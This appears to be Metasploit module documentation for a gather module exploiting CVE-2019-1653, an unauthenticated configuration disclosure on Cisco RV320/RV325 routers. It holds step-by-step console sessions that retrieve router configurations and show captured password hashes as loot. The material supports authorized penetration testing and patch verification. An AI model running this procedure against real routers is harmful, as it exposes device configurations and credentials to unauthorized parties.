## Vulnerable Application

[CVE-2019-1653](https://nvd.nist.gov/vuln/detail/CVE-2019-1653) (aka Cisco Bugtracker ID [CSCvg85922](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info)) is an unauthenticated disclosure of device configuration information for the Cisco RV320/RV325 small business router.  The vulnerability was responsibly disclosed by [RedTeam Pentesting GmbH](https://seclists.org/fulldisclosure/2019/Jan/52).

An exposed remote administration interface (on :443) would allow an attacker to retrieve password hashes and other sensitive device configuration information.  On version `1.4.2.15`, the vulnerabilty is exploitable via the WAN interface on port 8007 (by default) or 443 (if remote administration is enabled), in addition to port 443 on the LAN side.  On version `1.4.2.17`, only LAN port 443 is accessible by default, but user configuration can open port 443 for remote management on the WAN side, making the device vulnerable externally.

More context is available from [Rapid7's blog post](https://blog.rapid7.com/2019/01/29/cisco-r-rv320-rv325-router-unauthenticated-configuration-export-vulnerability-cve-2019-1653-what-you-need-to-know/).


## Verification Steps

 1. Start `msfconsole`
 2. `use auxiliary/gather/cisco_rv320_config`
 3. `set RHOSTS 192.168.1.1` (default LAN IP) or to the WAN interface
 4. `run`
 5. Review the downloaded configuration file cited in the output.  For example:
>```
>[+] Stored configuration (128658 bytes) to /home/administrator/.msf4/loot/20190206213439_default_192.168.1.1_cisco.rv.config_791561.txt
>```
 6. If the database is connected, review the `hosts`, `creds`, and `loot` commands

## Options

*SSL*: Should be set to 'true' for port 443 and set to 'false' for port 80 or port 8007.

*TARGETURI*: Should point to the `/cgi-bin/config.exp` endpoint and likely should never be changed.

## Scenarios

#### Against firmware version 1.4.2.15, on the LAN interface, port 443:

```
msf5 >
msf5 > use auxiliary/gather/cisco_rv320_config
msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
RHOSTS => 192.168.1.1
msf5 auxiliary(gather/cisco_rv320_config) > run

[+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_192.168.1.1_cisco.rv.config_434637.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Against firmware version 1.4.2.15, on the WAN interface, port 8007:

```
msf5 >
msf5 > use auxiliary/gather/cisco_rv320_config
msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 203.0.113.54
RHOSTS => 203.0.113.54
msf5 auxiliary(gather/cisco_rv320_config) > set RPORT 8007
RPORT => 8007
msf5 auxiliary(gather/cisco_rv320_config) > set SSL false
SSL => false
msf5 auxiliary(gather/cisco_rv320_config) > run

[+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_203.0.113.54_cisco.rv.config_434637.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Against firmware version 1.4.2.17, on the LAN interface, port 443:

```
msf5 >
msf5 > use auxiliary/gather/cisco_rv320_config
msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
RHOSTS => 192.168.1.1
msf5 auxiliary(gather/cisco_rv320_config) > run

[+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_192.168.1.1_cisco.rv.config_434637.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Against newer firmware (>= 1.4.2.19), on the LAN interface, port 443:

```
msf5 >
msf5 > use auxiliary/gather/cisco_rv320_config
msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
RHOSTS => 192.168.1.1
msf5 auxiliary(gather/cisco_rv320_config) > run

[-] Auxiliary aborted due to failure: not-vulnerable: Response suggests device is patched
[*] Auxiliary module execution completed
```

#### If module succeeds, check the database:

```
msf5 auxiliary(gather/cisco_rv320_config) > hosts

Hosts
=====

address      mac                name          os_name  os_flavor  os_sp  purpose  info  comments
-------      ---                ----          -------  ---------  -----  -------  ----  --------
203.0.113.54 70:E4:22:94:E7:20  router94e720  Cisco    RV320                            
192.168.1.1  70:E4:22:94:E7:20  router94e720  Cisco    RV320                            
```

```
msf5 auxiliary(gather/cisco_rv320_config) > creds
Credentials
===========

host         origin       service          public  private                            realm  private_type
----         ------       -------          ------  -------                            -----  ------------
203.0.113.54 192.168.1.1  8007/tcp (http)  cisco   $1$mldcsfp$gCrnS7A0ta6E5EzwDiZ9t/         Nonreplayable hash
192.168.1.1  192.168.1.1  443/tcp (https)  cisco   $1$mldcsfp$gCrnS7A0ta6E5EzwDiZ9t/         Nonreplayable hash
```

```
msf5 auxiliary(gather/cisco_rv320_config) > loot

Loot
====

host         service  type             name  content     info  path
----         -------  ----             ----  -------     ----  ----
203.0.113.54          cisco.rv.config        text/plain        /home/administrator/.msf4/loot/20190206213439_default_203.0.113.54_cisco.rv.config_791561.txt
192.168.1.1           cisco.rv.config        text/plain        /home/administrator/.msf4/loot/20190206211312_default_192.168.1.1_cisco.rv.config_412095.txt
```
